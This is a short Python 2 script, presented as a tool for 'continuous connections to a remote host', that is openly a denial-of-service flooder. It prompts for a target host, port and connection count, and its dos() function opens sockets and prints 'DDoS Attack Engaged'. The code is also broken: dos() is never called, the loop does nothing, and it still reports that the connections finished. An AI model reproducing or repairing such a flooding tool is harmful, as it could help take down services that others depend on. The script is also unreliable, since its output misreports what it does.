#!/usr/bin/env python

import socket
import time
import os
import sys
import string
from datetime import datetime


def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()

print "Tool by Stuart Gregg to launch continuous connections to a remote host"
print "-" * 60

remoteServer    = raw_input("Enter a remote host to connect: ")
remoteServerIP  = socket.gethostbyname(remoteServer) 

host = remoteServer
port = int(input("Please enter the port: "))
message = "-" * 60 
conns = int(input("Enter the amount of connections you wish to make: "))
ip = socket.gethostbyname(remoteServer)

print ("[" + ip + "]")

print ( "[Connecting to " + host + "]" )

t1 = datetime.now() 

def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, port))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("|[Connection Failed] |")
    print ( "|[DDoS Attack Engaged] |")
    ddos.close()
for i in range(1,10):
    [1,2,3,4,5,6,7,8,9]
print ("-") * 60
print("The connections you requested had finished")
print "-" * 60

t2 = datetime.now()

total =  t2 - t1

print 'Connections completed in: ', total
print "-" * 60

if __name__ == "__main__":
    answer = raw_input("Do you want to launch another connection?")
    if answer.strip() in "y Y yes Yes YES".split():
        restart_program()
    else:
        print "Hope you had fun"

input("Press enter to close program") 